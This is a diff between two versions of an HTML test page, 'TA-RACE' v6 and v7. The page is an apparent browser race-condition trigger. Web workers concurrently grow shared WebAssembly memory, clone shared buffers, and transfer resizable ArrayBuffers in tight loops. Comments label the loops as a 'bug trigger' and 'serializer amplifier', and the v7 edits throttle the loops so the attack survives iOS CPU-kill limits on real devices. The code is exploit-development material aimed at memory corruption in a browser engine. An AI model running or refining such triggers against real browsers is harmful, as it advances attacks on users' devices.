@@ -1,17 +1,17 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v6</title>
+<title>TA-RACE v7</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v6] transferAnchors + WASM grow, serializer-in-loop</div>
+<div id=o>[TA-RACE v7] throttled - survives CPU jetsam</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
-const tick=()=>new Promise(r=>setTimeout(r,0));
 window.addEventListener('error',e=>log("[ERROR] "+e.message));
 log("[*] UA: "+navigator.userAgent);
 
 const WK=`let u8=null, mem=null, who="";
 function lg(m){postMessage({log:who+" "+m});}
+const sl=t=>new Promise(r=>setTimeout(r,t));
 onmessage=async e=>{
   if(e.data.sab){
     who=e.data.who; u8=new Uint8Array(e.data.sab);
@@ -19,9 +19,8 @@ onmessage=async e=>{
     let i=0;
     while(true){
       try{structuredClone(u8.subarray(0,256));}catch(_){}
-      try{structuredClone(u8.subarray(256,512));}catch(_){}
       Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
-      if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
+      if((++i&0x1FFF)===0) await sl(5);
     }
   }
   if(e.data.mem){
@@ -29,23 +28,20 @@ onmessage=async e=>{
     lg("on WASM shared mem");
     let i=0;
     while(true){
-      // bug 2 trigger: concurrent grow on shared memory
-      try{mem.grow(1);}catch(_){}
-      // amplifier: serialize a view over the growing memory (Oct-27 signature)
-      try{structuredClone(new Uint8Array(mem.buffer));}catch(_){}
-      try{structuredClone(new Float64Array(mem.buffer));}catch(_){}
-      try{const dv=new DataView(mem.buffer); structuredClone(dv);}catch(_){}
-      if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
+      try{mem.grow(1);}catch(_){}                    // race trigger, cheap
+      if((i&7)===0){                                  // serializer amplifier, 1/8 duty
+        try{structuredClone(new Uint8Array(mem.buffer));}catch(_){}
+        try{structuredClone(new Float64Array(mem.buffer));}catch(_){}
+      }
+      if((++i&0x3FF)===0) await sl(5);
     }
   }
 };`;
 
 const wA=new Worker(URL.createObjectURL(new Blob([WK])));
 const wB=new Worker(URL.createObjectURL(new Blob([WK])));
-const wC=new Worker(URL.createObjectURL(new Blob([WK])));
 wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
 wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
-wC.onmessage=e=>{if(e.data.log)log(e.data.log);};
 
 const wR=new Worker(URL.createObjectURL(new Blob([`
 onmessage=e=>{ for(const ab of e.data.abs){
@@ -54,7 +50,7 @@ onmessage=e=>{ for(const ab of e.data.abs){
   try{ postMessage({abs:[out]},[out]); }catch(_){}
 } };
 `])));
-log("[1] 4 workers up");
+log("[1] 3 workers up");
 
 let sab=null, mu8=null;
 try{
@@ -62,17 +58,15 @@ try{
   mu8=new Uint8Array(sab);
   wA.postMessage({sab,who:'A'});
   wB.postMessage({sab,who:'B'});
-  wC.postMessage({sab,who:'C'});
-  log("[2] SAB -> 3 workers");
+  log("[2] SAB -> 2 workers");
 }catch(e){log("[FAIL] SAB: "+e.name);}
 
 let gmem=null;
 try{
-  gmem=new WebAssembly.Memory({initial:1,maximum:128,shared:true});
+  gmem=new WebAssembly.Memory({initial:1,maximum:16,shared:true});  // 1MB cap: clones stay cheap
   wA.postMessage({mem:gmem,who:'A'});
   wB.postMessage({mem:gmem,who:'B'});
-  wC.postMessage({mem:gmem,who:'C'});
-  log("[3] shared WASM mem -> 3 workers (serializer in loop)");
+  log("[3] shared WASM mem -> 2 workers (amplified, throttled)");
 }catch(e){log("[-] WASM share blocked: "+e.name);}
 
 let inFlight=0;
@@ -87,18 +81,18 @@ wR.onmessage=e=>{
   let it=0;
   log("[*] main loop");
   while(true){
-    if(inFlight<96){
+    if(inFlight<64){
       const ab=new ArrayBuffer(256,{maxByteLength:65536});
       try{ab.resize(4096+(it&8191));}catch(_){}
       try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
     }
     if(mu8){try{structuredClone(mu8.subarray(0,256));}catch(_){}}
-    if(gmem&&((it&0x7)===0)){
+    if(gmem&&((it&0x1F)===0)){
       try{gmem.grow(1);}catch(_){}
       try{structuredClone(new Uint8Array(gmem.buffer));}catch(_){}
     }
     it++;
-    if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await tick();}
+    if((it&0x1FF)===0){log("[*] it="+it+" inflight="+inFlight);await new Promise(r=>setTimeout(r,15));}
   }
 })();
 </script>
